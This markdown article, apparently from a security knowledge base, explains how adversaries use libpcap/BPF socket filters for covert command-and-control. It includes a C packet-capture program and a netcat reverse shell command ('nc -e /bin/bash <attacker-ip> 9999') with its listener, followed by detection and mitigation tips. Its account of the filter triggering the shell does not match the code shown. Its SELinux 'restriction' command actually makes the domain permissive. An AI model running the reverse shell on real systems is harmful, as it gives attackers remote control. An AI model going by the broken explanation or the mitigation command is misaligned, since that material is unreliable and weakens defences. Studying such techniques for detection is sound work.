---
title: Traffic Signaling:- Socket Filters in C2
category: Persistence
tags: [Traffic Signaling (T1205.001)]
---

Socket filters provide a mechanism at the kernel level for filtering, managing, and controlling network traffic. By using these filters, network administrators, security software, and even adversaries can craft controlled network communication pathways by selectively allowing or blocking traffic based on specific criteria.

Socket filters operate by attaching filters—typically using the **Berkeley Packet Filter (BPF)**—to network sockets. This enables the system to inspect, modify, and selectively process data packets as they flow through. With this setup, socket filters can analyze packet headers, payloads, and metadata, enabling decisions based on factors like IP addresses, port numbers, and protocols.

## Socket Filters for Backdoor Activation
#### **Initial Compromise and Filter Setup**

Once an adversary compromises a system, they may seek to maintain persistence through a covert backdoor or C&C channel. To do this, they can attach a custom socket filter to the network interface using tools like **libpcap** or **Winpcap** (Windows), or by directly using **setsockopt** with the **SO_ATTACH_FILTER** option. This socket filter allows the adversary to selectively monitor and intercept network traffic to and from the compromised system.

***Example:*** an adversary may install a filter on **eth0** (the primary network interface) to monitor TCP traffic on a specific port (e.g. 9999), which they’ll later use to communicate with a reverse shell or to send commands.

**libpcap-dev installation**
   `sudo apt install libpcap-dev`

    #include <pcap.h>
    #include <stdio.h>
    #include <stdlib.h>
    
    // Declare the packet handler function before main
    void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet);
    
    int main() {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t *handle;
    
        // Open network interface for packet capture
        handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf); // Adjust the interface name
        if (handle == NULL) {
            fprintf(stderr, "Error opening device: %s\n", errbuf);
            return 1;
        }
    
        // Set a filter for TCP traffic on port 9999 (reverse shell port)
        struct bpf_program fp;
        char filter_exp[] = "tcp port 9999";
        if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
            fprintf(stderr, "Error compiling filter\n");
            return 1;
        }
        if (pcap_setfilter(handle, &fp) == -1) {
            fprintf(stderr, "Error setting filter\n");
            return 1;
        }
    
        // Start capturing packets, invoking the packet handler on each match
        printf("Listening for traffic on port 9999...\n");
        pcap_loop(handle, 0, packet_handler, NULL);
    
        // Close the capture handle after the loop finishes
        pcap_close(handle);
        return 0;
    }
    
    // Define the packet handler function
    void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
        // Print out some basic info about the captured packet
        printf("Captured a packet matching the filter!\n");
        printf("Packet Length: %d bytes\n", pkthdr->len);
    
        // Simulate reverse shell activation
        printf("Simulating reverse shell activation...\n");
    
        // Additional actions can be triggered here based on packet contents
    }


This code uses **libpcap** to set a filter that monitors for TCP packets on port 9999. The adversary could tailor the filter to match specific conditions, ensuring that only traffic related to their backdoor is processed. Once the filter is set, no immediate actions will be visible, which makes detection harder.

**Compile the program**
   `gcc -o packet_capture packet_capture.c -lpcap`

**Run the program**
   `sudo ./packet_capture`


#### **2. Sending Crafted Packets to Trigger Reverse Shell**

Once the filter is active, the adversary can send a specially crafted packet to the compromised system that matches the filter criteria (i.e., TCP traffic on port 9999). This packet would not just match the filter but also trigger a **reverse shell** or **command invocation** based on the filter's configured actions.

For instance, using **netcat** or another tool, the attacker may initiate a reverse shell connection through the specified port:


**Set up the Reverse Shell Listener on adversary**
   `nc -lvnp 9999`


***Send a Packet to Trigger the Filter on victim machine***
`nc -e /bin/bash <attacker-ip> 9999` 

This command establishes a reverse shell to the attacker's machine, and since the filter is set to listen on port 9999, it will trigger the reverse shell activation when the packet is received.

#### **3. Triggering Command Shell or Implant Installation**

In this example, the filter could be used to trigger additional actions, such as:

-   **Installing a backdoor** or **implant** on the system.
-   **Command and control (C&C)**: Using the reverse shell to send further commands, enabling remote manipulation of the system.

The filter could be crafted to not just passively monitor traffic but to activate certain system features when certain types of packets are detected. This makes the attack highly stealthy, as there is minimal traffic to attract attention, and the filter's actions are only triggered under specific conditions.

#### **4. Evasion and Low Detection Risk**

Since the socket filter is designed to operate with minimal system overhead, its activity is difficult to detect. It is typically lightweight and does not involve complex processes that could raise suspicion. Additionally, because the socket connection is not activated until the filter receives a matching packet, there is limited activity on the host, making it hard to identify the attack.

The lack of visible network activity and the use of low-overhead socket operations mean that traditional network monitoring tools or IDS systems that rely on frequent traffic inspection may fail to detect the exfiltration or reverse shell activation.

### **Detection and Mitigation Techniques**

#### **A. Monitoring and Auditing Network Interfaces**

To detect the use of socket filters for covert backdoor activations, network administrators can monitor for suspicious BPF programs or unusual socket activity. Tools like **bpftool** can list active BPF programs attached to network interfaces, which can help identify abnormal or unauthorized filters.


**Check for BPF programs attached to network interfaces**
`sudo bpftool prog show` 

This can identify any filters that have been installed on the system, such as those attached to port 9999 for reverse shell activation.

#### **B. Inspecting Network Traffic**

Adversary-driven packet filters often utilize hidden or non-standard ports for command and control. By analyzing network traffic for deviations from normal patterns—such as traffic on uncommon ports or with unusual packet characteristics—defenders can identify potential exfiltration or C&C activity.

For example, using **tcpdump** to capture traffic on port 9999 can help detect attempts to trigger backdoors or implants.


***Capturing traffic on port 9999***
`sudo tcpdump -i eth0 port 9999`

#### **C. Kernel Auditing and System Integrity Checks**

Monitoring the integrity of the system kernel can help detect unauthorized filter installation. Using kernel auditing tools like **auditd** and monitoring for the loading of suspicious BPF programs or network-related system calls can provide early warning signs of an attack.

#### **D. Restricting Socket Filter Usage**

Restricting access to the ability to attach socket filters can help prevent adversaries from deploying them. Using system hardening techniques, such as configuring **SELinux** or **AppArmor**, can limit access to the relevant system calls or BPF functionalities.

***SELinux policy to restrict BPF program usage***

`semanage permissive -a bpfilter_t` 

#### **E. EDR**

Advanced EDR tools can help detect unusual processes and activities associated with backdoor activation, such as the sudden spawning of reverse shells or unusual socket connections. By correlating event logs and monitoring for anomalous behavior, defenders can identify and respond to attacks more effectively.

### **Conclusion**

The use of socket filters for covert backdoor activation and command and control is a powerful evasion technique used by adversaries. By exploiting ***libpcap*** or ***Winpcap***, attackers can create custom filters that monitor specific traffic and trigger malicious actions, such as reverse shells or implant installations, when certain criteria are met. Defenders must be vigilant in monitoring network interfaces, analyzing traffic patterns, and implementing security measures to detect and mitigate such attacks before they can cause damage.

